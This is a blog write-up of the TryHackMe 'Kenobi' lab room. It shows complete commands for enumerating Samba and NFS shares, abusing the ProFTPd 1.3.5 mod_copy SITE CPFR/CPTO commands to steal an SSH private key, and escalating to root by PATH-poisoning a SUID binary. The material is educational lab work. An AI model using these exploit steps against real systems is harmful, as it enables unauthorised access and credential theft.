---
layout: md
title: TryHackMe Kenobi Room
description: Notes on tryhackme.com's kenobi challenge
tags: ['security', 'tryhackme']
categories: ['linux', 'security', 'thm']
---

{% include project-headers.html %}

[TryHackMe ~ Kenobi](https://tryhackme.com/room/kenobi)

Includes:
- Recon
  - nmap
  - samba enumeration
  - nfs scans
- Exploit
  - netcat
  - searchsploit
- Privilege esculation
  - SUID binaries
  - PATH poisoning

### Recon

#### Nmap 
Port and service scan:
```bash
nmap -sV -sC <ip> -oX nmap-service-scan.xml | tee nmap-sevice-scan.txt 

Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-22 10:42 BST

Not shown: 993 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
    [... removed ...]
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m01s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2021-04-22T04:43:37-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-04-22T09:43:38
|_  start_date: N/A
```

Samba share enum:
```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <ip>

Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-22 10:47 BST
Nmap scan report for <ip>
Host is up (0.57s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\<ip>\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\<ip>\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\<ip>\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
```

nfs scan:
```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <ip>
```
Shows `/var` can be mounted via nfs.

#### Samba
Connect:
```bash
smbclient //<ip>/anonymous
```

Recursive download:
```bash
smbget -R smb://<ip>/anonymous
```
This gave a `log.txt` with some information about usernames, ssh key locations and the ftp service.

#### Searchspoilt
```bash
searchsploit proftp 1.3.5 
------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                |  Path
------------------------------------------------------------------------------ ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                     | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                           | linux/remote/36803.py
ProFTPd 1.3.5 - File Copy                                                     | linux/remote/36742.txt
------------------------------------------------------------------------------ ---------------------------------

searchsploit -p linux/remote/36742.txt
```
`linux/remote/36742.txt` shows an example of using nc and ProFTPd 1.3.5 to copy files to different locations on the system.

### Exploitation

#### Netcat -> ProFTPd File copy
We know the location of the ssh key from `log.txt` and a nfs location of `/var`.

```bash
nc <ip> 21                        
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [<ip>]

SITE CPFR /home/kenobi/.ssh/id_rsa 
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

#### Retrieving key
```bash
mkdir /mnt/kenobi
mount <ip>:/var /mnt/kenobi
cp /mnt/kenobi/tmp/id_rsa .
```

#### Using Key
```bash
chmod 600 id_rsa
ssh -i ./id_rsa kenobi@<ip>
```
and we are in!

#### Privilege Esculation

#### Searching for root suid binaries
```bash
find / -perm -u=s -type f 2>/dev/null
```
This find typical binaries and files like ping, sudo etc and `/usr/bin/menu`

#### Exploiting this

Running `/usr/bin/menu` brings up 3 options that just look like preconfigured system commands.
```
strings /usr/bin/menu

curl -I localhost
uname -r
ifconfig
```
These are the commands that are being used and would be run as root, they don't specify a full path so we can exploit these using the PATH variable to redirect the issued command to our own binary that will be run as root.

```
cd /tmp
echo /bin/sh > curl
chmod 777 curl
PATH=/tmp:$PATH; /usr/bin/menu
```
Run the curl command via the menu binary and `#`, root shell!





